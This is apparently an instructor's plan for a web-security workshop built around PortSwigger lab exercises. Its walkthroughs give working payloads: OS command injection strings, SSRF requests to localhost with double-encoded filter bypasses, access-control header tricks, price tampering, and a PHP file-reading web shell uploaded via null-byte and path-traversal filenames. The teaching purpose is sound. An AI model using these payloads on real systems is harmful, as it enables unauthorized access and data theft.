# Intro

Quick intro from instructors

## Getting Started 

Make sure all students have access to the Kali station and are fully functional.  Give an overview of what we are going to workshop, why we chose the topics (OWASP and personal fav's).

## Methodology
Talk about broad methodology, this is not meant to get you pulling bounties from H1 or Synack but more to have cognizance of common web app mistakes and a good understanding of how each bug class is exploited

## Discussion Broken Access Controls (10 Mins)
Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits

### Demo (2 Mins)
https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

//walkthrough
Enumerate site, nothing really on the main page.  Check out robots.txt and see that the admin panel is listed and navigate to it

https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url

//walkthrough
notice this in the source /admin-al12ax and navigate to it

### Student Lab (5 mins)
https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

### Instructor Solution (1 Mins)
https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented


//walkthrough
add X-Original-URL: /admin to request and see the difference
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete

## Discussion Business Logic Vulnerabilities (10 Mins)
Most security problems are weaknesses in an application that result from a broken or missing security control (authentication, access control, input validation, etc…). By contrast, business logic vulnerabilities are ways of using the legitimate processing flow of an application in a way that results in a negative consequence to the organization.

### Demo (2 Mins)
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level

//walkthrough
log in with weiner : peter and add the jacket to your cart, check the http history and give it a look, if you go negative with it you can get a negative balance and then you can balance out the transaction 

### Student Lab (5 Mins)
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

### Instructor solution (2 Mins)
https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

// walkthrough
Add to cart, then modify the price parameter
productId=1&redir=PRODUCT&quantity=1&price=1

## Discussion Injection (10 Mins)
An application is vulnerable to attack when:

- User-supplied data is not validated, filtered, or sanitized by the application.

- Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.

- Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.

- Hostile data is directly used or concatenated. The SQL or command contains the structure and malicious data in dynamic queries, commands, or stored procedures.


### Demo 
https://portswigger.net/web-security/os-command-injection/lab-simple

//walkthrough

modify the storeId parameter  productId=1&storeId=1;whoami

### Student Lab
https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

### Instructor Solution (2 Mins)
https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
//walkthrough
Modify the email parameter, note that this is blind so you are really just counting to see if you are getting execution
csrf=0pmJEQphMpXzJH6DZ24qLkxUgeWCZ95g&name=asdf&email=asdffsd%40gmail.com||ping+-c+10+127.0.0.1||&subject=asfd&message=asfd

https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

//walkthrough
open any item and check the image location then add your output to it
https://0a8e003a03edd6b0c07c39a800c800f4.web-security-academy.net/image?filename=output.txt
csrf=tUtP0VJ2JE9m9JyBb5ck8TnPI7oWxiri&name=asfd&email=x%40gmail.com||whoami>/var/www/images/output.txt||&subject=afd&message=safd

## Discussion Server Side Request Forgery (10 Mins)
SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

### Demo (2 Mins)
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

//walkthrough
Admin interface only available if logged in as an administrator, or if requested from loopback
check the stock and look at the request, modify the stockAPI parameter 

```
first try this to get the delete user url
stockApi=http://localhost/admin/

then try this to delete the user
stockApi=http://localhost/admin/delete?username=carlos

```
### Student Lab (5 mins)
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

### Instructor Solution (2 Mins)
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter


//walkthrough
do it like the last one but you get this:
"External stock check blocked for security reasons"

by the response we can tell this is probably a blocklist so lets try something different

try this...still blocked..
stockApi=http://127.1/admin

What about double encoding?
stockApi=http://127.1/%2561%64mi%6e

And finally
http://127.1/%2561%64mi%6e/delete?username=carlos

## Discussion File Upload (10 Mins)
Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.

The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to back-end systems, client-side attacks, or simple defacement. It depends on what the application does with the uploaded file and especially where it is stored.

### Demo (2 Mins)
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

//walkthrough
create file exploit.php containing below
```
<?php echo file_get_contents('/home/carlos/secret'); ?>

```
try to upload it and you get rejected, 
upload a blank .jpeg and copy image location in another tab
then intercept another upload request and swap filename filename="exploit.php%00.jpg"
in the get avatar link tab swap the request to exploit.php

### Student Lab (5 mins)
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

### Instructor Solution (2 Mins)
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

//walkthrough  

Do your normal upload and check it out, when you navigate to the exploit.php you notice that it doesn't actually execute the php because that directory is protected

Intercept the POST request and modify the content line to this:
```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

modify your GET request to call the next directory up
```
GET /files/exploit.php HTTP/1.1
```


## CTF TIME!!! 

